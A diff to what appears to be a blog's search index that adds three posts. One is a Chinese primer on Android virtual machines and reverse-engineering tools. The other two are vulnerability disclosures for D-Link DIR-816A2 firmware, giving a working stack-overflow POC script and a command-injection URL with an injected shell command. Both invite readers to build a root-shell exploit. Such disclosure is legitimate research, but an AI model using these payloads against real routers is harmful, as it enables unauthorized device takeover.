@@ -23,6 +23,31 @@
   
   
   <entry>
+    <title>Android概念基础</title>
+    <link href="/2024/06/06/Android%E6%A6%82%E5%BF%B5/"/>
+    <url>/2024/06/06/Android%E6%A6%82%E5%BF%B5/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Android基础"><a href="#Android基础" class="headerlink" title="Android基础"></a>Android基础</h1><p>先是从一些基本概念了解</p><h2 id="Android虚拟机"><a href="#Android虚拟机" class="headerlink" title="Android虚拟机"></a>Android虚拟机</h2><p><strong>Android虚拟机</strong>，简单来说，就是Android系统中运行应用程序的一个虚拟环境。它为每个Android应用提供了一个独立的运行空间，使得多个应用可以在同一个设备上同时运行，互不干扰。</p><h3 id="Android虚拟机分类"><a href="#Android虚拟机分类" class="headerlink" title="Android虚拟机分类"></a>Android虚拟机分类</h3><p><strong>Dalvik虚拟机（早期）：</strong> Android早期的虚拟机，Dalvik虚拟机是基于寄存器的虚拟机，它将dex字节码翻译成机器码逐条执行。</p><p><strong>ART虚拟机（目前）：</strong> Android 5.0以后引入的虚拟机，ART虚拟机是基于寄存器的虚拟机，它在应用程序安装时，会提前将dex字节码编译成机器码，这样在运行时可以显著提高应用程序的执行效率。</p><h3 id="和Java虚拟机区别"><a href="#和Java虚拟机区别" class="headerlink" title="和Java虚拟机区别"></a>和Java虚拟机区别</h3><p><strong>字节码格式不同：</strong> Android虚拟机执行的是dex字节码，而Java虚拟机执行的是class字节码。</p><p><strong>垃圾回收机制不同：</strong> 两者的垃圾回收机制也有所不同。</p><p><strong>指令集不同：</strong> 虽然都是基于寄存器的虚拟机，但指令集的细节有所差异。</p><h3 id="smali和dex"><a href="#smali和dex" class="headerlink" title="smali和dex"></a>smali和dex</h3><p><strong>smali</strong>是一种类似汇编的中间语言，它是Android虚拟机（Dalvik或ART）执行的代码。当我们用Java语言编写Android应用程序时，编译器会将Java代码编译成字节码（.class文件），然后打包成DEX（Dalvik Executable）文件，DEX文件再被进一步编译成smali代码。形象地说，smali代码就是Android虚拟机能直接理解的“机器语言”。</p><p><strong>DEX</strong>文件是Dalvik可执行文件的缩写，它是Android应用程序的核心文件。DEX文件包含了Dalvik虚拟机执行所需的所有信息，包括类定义、方法实现、常量池等。DEX文件是smali代码的集合，是应用程序在设备上运行的直接载体。</p><p><strong>smali代码是DEX文件的组成部分。</strong> 一个DEX文件包含多个smali文件。</p><p><strong>smali代码是DEX文件的低级表示。</strong> smali代码更接近于机器指令，更容易理解虚拟机的执行过程。</p><p>smali代码是DEX文件的一个中间表示，它比DEX文件更接近机器码，但又比机器码更易于理解。smali代码是Android虚拟机解释执行的。</p><table><thead><tr><th>类比对象</th><th>ELF文件</th><th>APK文件</th></tr></thead><tbody><tr><td>对应关系</td><td>代码段</td><td>smali代码</td></tr><tr><td>作用</td><td>存储可执行指令</td><td>存储Android应用程序的代码</td></tr><tr><td>格式</td><td>二进制格式</td><td>文本格式（更易读）</td></tr><tr><td>层次</td><td>更底层，直接对应机器指令</td><td>比机器码高一层，但比Java代码低一层</td></tr></tbody></table><h2 id="Android开发基础"><a href="#Android开发基础" class="headerlink" title="Android开发基础"></a>Android开发基础</h2><p>Android开发和普通Java开发的区别，可以研究以下几个方面：</p><p><strong>Android四大组件：Activity、Service、BroadcastReceiver、ContentProvider</strong></p><p><strong>Android布局管理器</strong></p><p><strong>Android生命周期</strong></p><p><strong>Android权限管理</strong></p><p><strong>Android性能优化</strong></p><h3 id="Android开发的工具和环境"><a href="#Android开发的工具和环境" class="headerlink" title="Android开发的工具和环境"></a>Android开发的工具和环境</h3><p><strong>Android Studio：</strong> 谷歌官方推荐的Android集成开发环境（IDE），提供了代码编辑、调试、构建、打包等一系列功能。</p><p><strong>Android SDK：</strong> Android软件开发工具包，包含了开发Android应用所需的API、工具和文档。</p><p><strong>Java Development Kit (JDK)：</strong> Java开发工具包，用于编译Java代码。</p><h3 id="和普通Java开发区别"><a href="#和普通Java开发区别" class="headerlink" title="和普通Java开发区别"></a>和普通Java开发区别</h3><h4 id="运行角度"><a href="#运行角度" class="headerlink" title="运行角度"></a>运行角度</h4><p>Android应用运行在Android虚拟机（Dalvik或ART）中，这个虚拟机为Android应用提供了特定的运行环境，包括UI组件、系统服务、权限管理等。普通Java应用程序通常运行在Java虚拟机（JVM）中，这个虚拟机提供了标准的Java API，用于开发各种类型的应用程序。</p><h4 id="开发角度"><a href="#开发角度" class="headerlink" title="开发角度"></a>开发角度</h4><p>虽然Android应用开发和普通Java开发都使用Java语言，但由于运行环境、UI框架、设备特性等方面的差异，Android应用开发具有其独特的特点。Android开发者需要掌握Android SDK、Android Studio等工具，以及Android特有的开发模式。</p><p><strong>Android开发虽然以Java语言为基础，但更重要的是基于Android SDK（Software Development Kit，软件开发工具包）进行开发。</strong></p><p><strong>Java语言是基础：Android应用的代码主要由Java语言编写，但Java语言只是提供了一种编写代码的语法和基础类库。</strong></p><p><strong>SDK是核心：Android SDK才是Android开发的“灵魂”。它提供了一系列的API（Application Programming Interface，应用程序编程接口），这些API封装了Android系统的底层功能。</strong></p><p>形象地说，Java语言是盖房子的砖头，而Android SDK就是图纸和施工规范。</p><h4 id="打包角度"><a href="#打包角度" class="headerlink" title="打包角度"></a>打包角度</h4><p>Android应用需要打包成APK文件，并通过Google Play或其他应用市场发布。普通Java应用程序可以打包成JAR文件、WAR文件等，发布方式也更加多样。</p><h4 id="编译角度"><a href="#编译角度" class="headerlink" title="编译角度"></a>编译角度</h4><p>首先看下普通的Java程序：</p><blockquote><p>Java 源代码被编译成 .class 文件。</p><p>如果需要进一步打包， .class 文件通常被打包成 JAR (Java Archive) 文件，用于创建可执行的 JAR 文件或部署到应用服务器的 WAR (Web Application Archive) 文件。JAR 文件可以直接运行，WAR 文件需要部署到应用服务器上才能运行。</p></blockquote><p>对于Android应用：</p><blockquote><p><strong>Java源代码编译成class文件：</strong>和普通 Java 程序一样，Android 应用的 Java 源代码也会被编译成 .class 文件。</p><p><strong>class文件转换为dex文件：</strong> 为了适应 Android 虚拟机（Dalvik 或 ART），这些 .class 文件会被进一步处理，合并成一个或者多个 DEX (Dalvik Executable) 文件。DEX 文件是 Dalvik&#x2F;ART 虚拟机可以直接执行的格式，它包含了代码、常量池、类信息等。</p><p><strong>打包成APK：</strong> DEX 文件和其他资源文件（如布局文件、图片、配置文件等）一起打包成 APK (Android Package) 文件，这就是我们最终得到的 Android 应用程序安装包。</p></blockquote><h2 id="逆向工具"><a href="#逆向工具" class="headerlink" title="逆向工具"></a>逆向工具</h2><p><strong>APKTool:</strong></p><ul><li><strong>功能:</strong> 将 APK 文件反编译成 smali 代码、资源文件等，以及重新打包成 APK。</li><li><strong>特点:</strong> 易于使用，是 Android 逆向工程的入门级工具。</li><li><strong>主要用途:</strong> 查看 APK 的结构、修改资源文件、进行简单的代码修改。</li></ul><p><strong>jadx:</strong></p><ul><li><strong>功能:</strong> 将 DEX 文件反编译成 Java 代码，可读性更强。</li><li><strong>特点:</strong> 反编译质量较高，支持调试。</li><li><strong>主要用途:</strong> 深入分析代码逻辑，定位问题。</li></ul><p><strong>JEB Decompiler:</strong></p><ul><li><strong>功能:</strong> 商业级反编译工具，支持多种文件格式，包括 APK、DEX、ELF 等。</li><li><strong>特点:</strong> 反编译质量高，提供强大的分析和调试功能，支持插件扩展。</li><li><strong>主要用途:</strong> 进行复杂的逆向分析，定位漏洞。</li></ul><p><strong>Frida:</strong></p><ul><li><strong>功能:</strong> 动态插桩工具，可以在运行时注入代码，修改程序行为。</li><li><strong>特点:</strong> 灵活强大，支持多种平台，可用于hook 系统调用、修改内存数据等。</li><li><strong>主要用途:</strong> 动态调试、脱壳、反反调试。</li></ul><p><strong>Radare2:</strong></p><ul><li><strong>功能:</strong> 开源逆向工程框架，支持多种文件格式，功能强大。</li><li><strong>特点:</strong> 可定制性强，支持脚本编写，可用于二进制分析、调试、逆向。</li><li><strong>主要用途:</strong> 深入分析二进制代码，挖掘漏洞。</li></ul><p><strong>IDA Pro:</strong></p><ul><li><strong>功能:</strong> 商业级反汇编工具，支持多种处理器架构。</li><li><strong>特点:</strong> 功能强大，可用于分析各种类型的二进制文件。</li><li><strong>主要用途:</strong> 分析 native 代码，定位漏洞。</li><li><strong>Native代码</strong>，顾名思义，就是“原生”代码。它指的是用<strong>除Java之外的其他编程语言</strong>编写的代码，并且通常是<strong>直接编译成机器码</strong>，能够高效地运行在特定的硬件平台上。Java通过<strong>JNI（Java Native Interface）</strong>机制来调用Native代码。JNI提供了一套API，允许Java代码加载动态链接库（如.so文件），并调用其中的Native方法。</li></ul>]]></content>
+    
+    
+    <categories>
+      
+      <category>Learning</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>Android</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Fuzzilli源码解析2</title>
     <link href="/2024/05/13/Fuzzilli%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%902/"/>
     <url>/2024/05/13/Fuzzilli%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%902/</url>
@@ -65,6 +90,56 @@
     <tags>
       
       <tag>Fuzzilli</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>IoT--StackOverflow</title>
+    <link href="/2024/03/07/IoT-StackOverflow/"/>
+    <url>/2024/03/07/IoT-StackOverflow/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Dlink DIR-816A2_FWv1.10CNB05.</p><h1 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h1><p>Dlink DIR-816A2_FWv1.10CNB05 was discovered to contain a stack overflow via parameter wizardstep4_ssid_5.</p><h1 id="Firmware-download-address"><a href="#Firmware-download-address" class="headerlink" title="Firmware download address"></a>Firmware download address</h1><p>Manufacturer’s address: <a href="https://www.dlink.com/">https://www.dlink.com/</a></p><p>Firmware download address: <a href="http://www.dlink.com.cn/techsupport/AllPro.aspx">D-Link Technical Support (dlink.com.cn)</a></p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211202652.png"></p><h1 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h1><p>From the following, we can see that there are two places where our input parameters wizardstep4_ssid_2 and wizardstep4_ssid_5 are written into v25 respectively, and there is no length limit. Every time we write our parameters to v25, we perform a doSystem operation, which allows for command injection through both parameters, as we mentioned in the previous article.</p><p>Here we focus on v19 and v20, which are respectively written into v25 without length restrictions, which can cause stack overflow. Due to repeated writes into a buffer, we have decided to cause overflow when v20 is written into v25.</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211213600.png"></p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211225412.png"></p><h1 id="Recurring-vulnerabilities-and-POC"><a href="#Recurring-vulnerabilities-and-POC" class="headerlink" title="Recurring vulnerabilities and POC"></a>Recurring vulnerabilities and POC</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://192.168.1.25/goform/dir_setWanWifi&quot;</span><br><br>data = &#123;<br>    <span class="hljs-string">&#x27;connecttype&#x27;</span>:<span class="hljs-string">&#x27;DHCP&#x27;</span>,<br>    <span class="hljs-string">&#x27;statuscheckpppoeuser&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;wizardstep4_ssid_2&#x27;</span>:<span class="hljs-string">&#x27;123456&#x27;</span>,<br>    <span class="hljs-string">&#x27;wizardstep4_ssid_5&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000</span><br>&#125;<br><br>response = requests.post(url,data=data)<br></code></pre></td></tr></table></figure><p>The following is the result in gdb after sending POC:</p><p>Firstly, execute sprintf to write parameter wizardstep4_ssid_5 to v25, corresponding to the circled part in IDA:</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211240631.png"></p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211253417.png"></p><p>The result returned by sprintf is 0x3fe, indicating that our parameters were successfully written into v25.</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211307047.png"></p><p>Continuing with the following execution until the function reaches its end, it can be observed that the return address has been overwritten as’ aaaa ‘.</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211319088.png"></p><p>Continuing to run will cause the program to crash.</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211331537.png"></p><p>Entering again will result in no response.</p><p><img src="/2024/03/07/IoT-StackOverflow/image-20240906211340336.png"></p><p>And you can write your own exp(ROP gadget) to get the root shell.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Linux</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>IoT</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>IoT--CommandExecution</title>
+    <link href="/2024/03/06/IoT-CommandExecution/"/>
+    <url>/2024/03/06/IoT-CommandExecution/</url>
+    
+    <content type="html"><![CDATA[<h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>Dlink DIR-816A2_FWv1.10CNB05.</p><h1 id="Vulnerability-Description"><a href="#Vulnerability-Description" class="headerlink" title="Vulnerability Description"></a>Vulnerability Description</h1><p>Dlink DIR-816A2_FWv1.10CNB05 was discovered to contain a command injection via parameter wizardstep4_ssid_2.</p><h1 id="Firmware-download-address"><a href="#Firmware-download-address" class="headerlink" title="Firmware download address"></a>Firmware download address</h1><p>Manufacturer’s address: <a href="https://www.dlink.com/">https://www.dlink.com/</a></p><p>Firmware download address: <a href="http://www.dlink.com.cn/techsupport/AllPro.aspx">D-Link Technical Support (dlink.com.cn)</a></p><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906210959390.png"></p><h1 id="Vulnerability-Details"><a href="#Vulnerability-Details" class="headerlink" title="Vulnerability Details"></a>Vulnerability Details</h1><p>Dlink DIR-816A2_FWv1.10CNB05 is affected by a remote command injection vulnerability.  We can construct a parameter wizardstep4_ssid_2 that includes command execution, and when we request &#x2F;goform&#x2F;dir_setWanWifi, it will be sub_ 42DA54 function processing, ultimately leading to command execution.</p><p>We can perform command injection through parameter wizardstep4_ssid_2. The same effect can also be achieved through parameter wizardstep4_ssid_5:</p><p>Obtain parameters wizardstep4_ssid_2 to v19, ultimately write them into v25, and then execute them in doSystem.</p><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906211010678.png"></p><h1 id="Recurring-vulnerabilities-and-POC"><a href="#Recurring-vulnerabilities-and-POC" class="headerlink" title="Recurring vulnerabilities and POC"></a>Recurring vulnerabilities and POC</h1><p>We can directly enter in the address bar:</p><pre><code class="hljs">http://192.168.1.25/goform/dir_setWanWifi?connecttype=DHCP&amp;statuscheckpppoeuser=0&amp;wizardstep4_ssid_2=123456;mkdir dingjiayu</code></pre><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906211041679.png"></p><p>The following is the parameter status before entering the doSystem function in gdb:</p><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906211054699.png"></p><p>When entering doSystem, check the parameters passed in through register A0:</p><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906211104610.png"></p><p>Now we continue to execute and find that the command has been executed, creating the dingjiayu folder:</p><p><img src="/2024/03/06/IoT-CommandExecution/image-20240906211114175.png"></p><p>And you can write your own exp to get the root shell.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>Linux</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>IoT</tag>
       
     </tags>
     
